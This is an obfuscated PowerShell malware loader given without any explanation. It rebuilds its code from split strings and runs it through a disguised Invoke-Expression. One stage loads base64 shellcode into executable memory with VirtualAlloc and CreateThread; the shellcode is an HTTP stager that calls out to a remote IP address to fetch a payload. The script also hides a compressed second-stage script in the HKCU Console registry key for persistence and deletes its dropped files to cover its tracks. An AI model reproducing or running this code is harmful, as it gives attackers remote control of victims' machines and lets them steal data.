(('Set-StrictMode -Version 2

Mw7QDoIt = @OiS
function func_get_proc_address {
'+'     Param (Mw7Qvar_mo'+'dule, Mw7Qvar_procedure)
        Mw7Qvar_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() i42 Where-Object'+' { Mw7Q_.GlobalAssemblyCache -A'+'nd Mw7Q_.Location.Split(OiSwlGswlGsOiS)[-1].Equals(OiSSystem.dllOiS) }).Ge'+'tType(OiSMic'+'roso'+'ft.Win32.UnsafeNativeM'+'ethodsOiS)'+'

        return Mw7Qvar_unsafe_nati'+'ve_methods.GetMethod(OiSGetProcAddressOiS).Invoke(Mw7'+'Qnull, @([Syste'+'m.Ru'+'ntime.InteropSer'+'vices.HandleRef](New-Objec'+'t Sys'+'tem.Runtime.InteropServices.HandleRef((New-Object IntPtr), (Mw7Qvar_unsafe_native_methods.GetMethod(OiSGetModuleHandleOiS)).Invoke(Mw7Qnull, @(Mw7Q'+'var_module)))), Mw7Qvar_procedure))
}

function func_get_delegate_type'+' {
        Param (
                [Parameter(Position = 0, Mandatory = Mw7QTrue'+')] [Type[]] Mw7Qvar_parameters,
                [Parameter(Position = 1)] [Type] Mw7Qvar_return_type = [Void]
        )

        Mw7Qvar_type_b'+'uilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Objec'+'t System.Refle'+'cti'+'o'+'n.Assembl'+'yName(OiSReflectedDelegateOiS))'+', [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineD'+'ynamicModule(OiSInMemoryModuleOiS, Mw7Qfalse).DefineType(OiSMyDelegateTypeOiS, OiSClass, Public, '+'Sealed, AnsiClass, AutoClassOiS, [Syst'+'em.MulticastDeleg'+'ate])'+'
        Mw7Qvar_type_bui'+'lder.DefineConstructor(OiSRTSpecialName, HideBySig,'+' PublicOiS, [System.Reflection.CallingConventio'+'ns]::Standard, Mw7Qvar_par'+'a'+'meters).SetImplementationFlags(OiSRuntime, ManagedOiS)
        M'+'w7Qvar_type_builder.DefineMethod(OiSInvokeOiS, OiSPublic, HideBySig, NewSlot, VirtualOiS, Mw7Qvar_return_type, Mw7Qvar_parameters).SetImpleme'+'ntationFlags(OiSRuntime, ManagedOiS)

        return Mw7Qvar_type_builder.CreateType()
}

[Byte[]]Mw7Qvar_code ='+' [System.Convert]::FromBase64String(M0Rl/OiJAAAAYInlMdJki1Iw'+'i1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdC'+'LQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldAB'+'od2luaVRoTHcmB//V6IAAAABNb3ppbGxhLzUuM'+'CAoV2luZG93cyBOVCA2LjE7I'+'FdPVzY0OyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbwBYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWF'+'hYWFhYWFhYWFhYWFhYWFhYAFkx/1dXV1dRaDpWeaf/1emTAAAAWzHJUVFqA1FRaAUNAABTUGhXiZ/G/9WJw+t6WTHSUmgA'+'Mq'+'CEUlJSUVJQaOtVLjv/1YnGaIAzAACJ4GoEUGofVmh1Rp6G/9Ux/1dXV1dWaC0GGHv/1YXAdEgx/4X2dAS'+'J+esJaKrF4l3/1YnBaEUhXjH/1TH/V2oHUVZQaLdX4Av/1b8ALwAAOcd1BInY64ox/+sV60nogf///y9TZFpLAABo8LWiVv/VakBoABAAAGgAA'+'EAAV2hYpFPl/9'+'WTU1OJ51doACAAAFNWaBKWie'+'L/1YXAdM2LBwHDhcB15VjD6B3///8xOTIuMTU0LjIyNC41NwA=M0Rl)

Mw7Qvar_buffer = [System.Runtime.Int'+'eropServices.Marshal]::Get'+'Delegate'+'ForFunctionPointe'+'r((func_ge'+'t_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], ['+'UInt32]) ([IntPtr]))).Invoke([I'+'ntPtr]::Ze'+'ro, Mw7Qvar_code.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy(Mw7Qvar_code, 0,'+' Mw7Qv'+'ar_buffe'+'r, Mw'+'7Qvar_code.length)

Mw7Qvar_hthread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll CreateThread), (func_get_delegate_type @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])'+')).Invoke([IntPtr]::Ze'+'ro,0,Mw7Qv'+'ar_buffer,[IntPtr]::Zero,0,[IntPtr]::Zero)
[Syste'+'m.Runti'+'m'+'e.InteropServices.Marshal]::GetDelegateFor'+'FunctionPointer((func_get_proc_address kernel32.dll WaitForSingleObject), (func_get_delegate_type @([IntPtr], [Int'+'32]))).Invoke(Mw7Qvar_ht'+'hread,0xffffffff) i42 Out-Null
OiS@

If ([IntPtr]::size -eq 8) {
        start-job { param(Mw7Qa) IEX Mw7Qa } -RunAs32 -Argument '+'Mw7QDoIt i42 wait-job i42 Receive-Job
}
else {
        IEX Mw7QDoIt
}'+'

Mw7Qcod'+'e = M0RlH4sIAAAAAAAAAL1XbW/iOBD+XH5FdKqURKUECtvlVqq0Di8lLJRAWijlUGUS'+'J7h1Yh'+'o7pfR2//tNQuiy1+5eTyddJEv2eMYeP/M'+'ah8hjR8bUlX3uEeV4TGJBeaScFAqHTW5'+'J5Uz5rBb8JHJlSk4ntwGRt6uYu7fY82IihPJn4cDGMQ4V7fARx7ch9xJGikq2SBmJl8REPzgoHGSkJBLY'+'J7cRlvSR3IZELrkn4CJthlarJg8xjeafPjWSOCaR3K5L50QiIUi4YJQITVe+KpMlicnxYHFHXKn8qRzels4ZX2CWs20a2F3Cg1DkpXs97uL0BSVnxajU1D/+UPXZcW'+'Veaj0kmAlNdTZCkrDkMabqyjc9vfBysyKa2qduzAX3ZWlCo+pJ6SrT/iJTvr/VXdUL8LaYyCSOlJ8/MT1zK6GpMLUBGbRFUNVLVvTI74l2GCWMFZXP2ixXaJREko'+'YE9iWJ+coh8SN1iSh1cOQxMiL+XLsg6x0O7xXS9oWAy5axXszN9x7d+5mJt8ep+mvt9/xAh++VL+iFb4U3vMojjARYklsJ0O+5VeHgYJZNCbxHs7mgmdyZUi4qfVACSx5vYHl4GSdEnyuz1HSz+Ty/dicpij89qLKTymW2xtzqcabMxpx688JBZudsP924XSSUeSROGX7uuU3i04g0NxEO'+'qbtzTu0toxGfkQyQ0o7tAhTV1HyDeM0cHjVFdPZarBVS+SJrbpVDLhhegFbgE/qPymyNqKl'+'W1CchALhdq2AsH0KC7LjzMNjsbk/XwKQ2GBaiqNgJxKRbVByCGfGKCooEzbdQInk2Vb+r20+YpC4WcnfcXH8D0vzqBo+EjBMXzAs'+'wXDor4lLMUlSKSod6xNw4NNipoL6JSQMzRqMATnoEm'+'wAlxcKRqdPEXvHvDqKXHCKtcMVICNxZxmgzHEB+yEMq8zccEE/9hdq7Q'+'NlGRYrVDqQ9pcEBHMZlURnTWEIOUouvPO8/qvdjSvpBz0ZMcktqWSjOzI1MAybjdNNKcPYCZgZdLAG2dsxDEw'+'tyWktLRhRovxkD2kXwTa2I9b'+'3uPa1Yaxh9GFe0avHmR+9L965j9N2GsM/bdUTXwdqtXyDXp/V29xr4hrRs1ZHX6A07'+'tL3ujL4gzwRaMKWV'+'IECefWe3wt6FJcxKfs5W3q3VOtdlVK3WBtXyvUe6K'+'f898i5Cun7'+'qwRxy66BnglzZYq1u'+'Y7SYnLRvJqxj1NpLf8KFc'+'1q78fqu+T'+'DsDYcYoSFCJjeMegedc4Tb9P'+'7q6NqoTG00tKLOVbODRKdRxmOT35x/eJ6O'+'R/yy44amYYyTkxYg0IxJhXafuP04tDcfhiko9uCe+rR52jJRYMtT/+7Lx2m6YQXToSWmw1owzejLh7fpAXmhOy36Mqf+oPvERov'+'gSLSuTjhKB24FDdD/odU2ORahu/GN8dI1K'+'1fTaO30+oiaS0S'+'fm7E7oMiAD523l1Pnw7N3'+'3o5unFqt37x6unieVnphe42dD8'+'teeLOcnozp4tmMeyFLbsI6moDIrway4C5'+'LWMNpYAU'+'28/3A4/XehI4fjTEeBJcpviMbVWq2MaZ+o9ewot6pY4M2R50jdtQbPdHmEWpXBlO707'+'GEsfz9tGtwWe+i4Gmz6Bj1'+'09H1uOI1l8'+'bKGVcG5uljHQAxHWwP0Z14Nipj6U/uqkYKvY/8VdX4aBi16No4cs9+g3A4KGTevUh8f5uz/6FY9nEslpiB30PB22WrNo/bedmyOU0lNO3tpuiexBFh0'+'DBAS7'+'GLccQYd9NC+5OKB2V/W4znkMuuYFo9eXOmKy+M+vfquyN9+nQDD8mTRxrMp'+'R6JArkslp+q5TKUzPJTrawX3v/+Bl9ttJfTimnV3YNy/yKWXaQXtlAv5'+'RLyjPc/Y53ntuzqf4/1d9ovdt+Ff7m4D9KrzR8J/8Yc/x2iCaYSRB3I4Yxsu5D3IpU74'+'F7Pt2dp8DA//9IWfZDI4wvoCAvq50LB8pU9hAR9huacPCh1Pe3zhMSxPL7jC+jks3KnHWJdsVrXyiFWvinHAAoS1RN'+'o5+MgSWufsv07+aqs4SmZ4FdlRFwCLetxly+gphFoYdKjs0NSZqD9BXCbxnvuDAAAM0Rl
Set-ItemProperty M0RlH'+'KCU:wlGsConsolewlGsM0Rl -Name ContentScript -Value Mw7Qcode;

Mw7Qbase'+'64 = M0RlcmVtb3ZlLWl0ZW0gLXBhdGggKEpvaW4tUGF0aCAiJGVudjp1c2VycHJvZmlsZSIgJ3Rlc3'+'QucHMxJykgLWZvcmNlOyByZW1vdmUtaXRlbSAtcGF0aCAoSm9pbi1QYXRoICIk'+'ZW52OnVzZXJwcm9maWxlIiAncG93ZXJzaGRsbC5kbGwnKSAtZm9yY2U7IElFWCAoTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoTmV3LU9iamVjdCBJTy5Db21wcmVzc2'+'lvbi5Hemlw'+'U3RyZWFtKChOZXctT2JqZWN0IElPLk1lb'+'W9yeVN0cmVhbSgsW0NvbnZlcnRdOjpGc'+'m9tQmFzZTY'+'0U3RyaW5nKChncCAnSEtDVTpcQ29uc29sZScpLkNvbnRlbnRTY3JpcHQpKSksW0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0'+'6OkRlY29tcHJlc3MpKSkuUmVhZFRvRW5kKCk7M0'+'Rl
Set-ItemProperty M0RlHKCU:wlGsC'+'onsolewlGsM0Rl -Name EScript '+'-Value Mw7Qbase64;') -cREPLAcE([cHaR]77+[cHaR]48+[cHaR]82+[cHaR]108),[cHaR]34-cREPLAcE ([cHaR]77+[cHaR]119+[cHaR]55+[cHaR]81),[cHaR]36-rEpLaCE  'wlGs',[cHaR]92-rEpLaCE 'i42',[cHaR]124-cREPLAcE 'OiS',[cHaR]39)| & ( $PshOme[4]+$PsHomE[30]+'x')
